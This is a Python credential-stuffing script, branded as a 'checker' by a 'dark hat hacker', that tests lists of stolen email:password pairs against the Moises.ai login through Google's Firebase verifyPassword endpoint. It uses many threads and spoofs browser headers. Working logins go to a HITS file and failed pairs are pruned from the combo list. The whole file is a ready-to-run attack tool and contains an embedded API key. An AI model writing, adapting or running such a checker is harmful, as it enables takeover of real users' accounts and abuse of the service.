import requests
import json
from termcolor import colored  
from concurrent.futures import ThreadPoolExecutor
import threading


file_lock = threading.Lock()


url = "https://www.googleapis.com/identitytoolkit/v3/relyingparty/verifyPassword?key=AIzaSyDWcFRZcUnN5EPNNA7jrcuS3HlIvMqtuCs"


with open('combo.txt', 'r') as file:
    accounts = [line.strip().split(':') for line in file]


# Print the message in medium size with specified colors
print(colored("MOISES.AI", 'red', attrs=['bold']) +
      colored(" CHECKER ", 'yellow', attrs=['bold']) +
      colored("BY", 'yellow', attrs=['bold']) +
      colored(" DARK", 'red', attrs=['bold']) +
      colored("HAT", 'green', attrs=['bold']) +
      colored(" HACKER", 'blue', attrs=['bold']))


num_bots = int(input("Enter the number of bots: "))


headers = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36",
    "Pragma": "no-cache",
    "Accept": "*/*",
    "authority": "www.googleapis.com",
    "accept-language": "en-US,en;q=0.9",
    "content-type": "application/json",
    "origin": "https://studio.moises.ai",
    "referer": "https://studio.moises.ai/",
    "sec-ch-ua": "\"Not_A Brand\";v=\"8\", \"Chromium\";v=\"120\", \"Google Chrome\";v=\"120\"",
    "sec-ch-ua-mobile": "?0",
    "sec-ch-ua-platform": "\"Windows\"",
    "sec-fetch-dest": "empty",
    "sec-fetch-mode": "cors",
    "sec-fetch-site": "cross-site",
    "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "x-client-data": "CIe2yQEIprbJAQipncoBCKf3ygEIkqHLAQiFoM0BCKLuzQEIg/DNARj2yc0BGKfqzQEY+vLNARjrjaUX",
    "x-client-version": "Chrome/JsCore/8.10.1/FirebaseCore-web",
    "x-firebase-locale": "en-US"
}

def check_account(email, password):
    payload = {
        "email": email,
        "password": password,
        "returnSecureToken": True
    }

    
    response = requests.post(url, data=json.dumps(payload), headers=headers)

  
    if "idToken" in response.text:
        print(colored(f"{email}:{password} | HIT", 'green'))
        
        with open('HITS.txt', 'a') as hit_file:
            hit_file.write(f"{email}:{password}\n")
    else:
        print(colored(f"{email}:{password} | dead Account", 'red'))
        
        with file_lock:
            try:
                accounts.remove([email, password])
                with open('combo.txt', 'w') as file:
                    for acc in accounts:
                        file.write(':'.join(acc) + '\n')
            except ValueError:
                pass  
              
with ThreadPoolExecutor(max_workers=num_bots) as executor:
    
    for email, password in accounts.copy():  
        executor.submit(check_account, email, password)
